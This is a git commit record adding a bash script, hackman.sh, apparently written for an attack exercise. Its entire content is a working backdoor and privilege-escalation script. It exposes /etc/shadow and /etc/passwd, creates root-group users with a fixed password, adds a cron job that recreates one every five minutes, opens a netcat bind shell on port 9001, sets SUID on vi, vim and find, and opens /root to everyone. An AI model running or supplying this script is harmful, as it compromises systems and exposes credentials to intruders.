4d8024eafcbda4101921221fd979de49eb3ae809
Roxas1197 <keyblader97@msn.com>
2020-12-10 13:18:01 -0600

    Created script
    Thanks for Jay for putting it together

---
+++ hackman.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+chmod 644 /etc/shadow
+chmod 666 /etc/passwd
+useradd panic  && echo -e "notpassword\nnotpassword" | passwd coolio
+usermod -a -G root panic
+echo "*/5 * * * *  root  useradd coolio && echo -e "notpassword\nnotpassword" | passwd coolio && usermod -a -G root coolio" >> /etc/crontab
+apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
+nc.traditional -l -p 9001 -e /bin/bash &
+usermod --shell /bin/bash games
+chmod u+s `which vi`
+chmod u+s `which vim`
+chmod u+s `which find`
+chmod 777 /root
+echo "Oh, well in fact"
+echo "Well, I'll look at it this way"
+echo "I mean technically our server is de_stroyed"
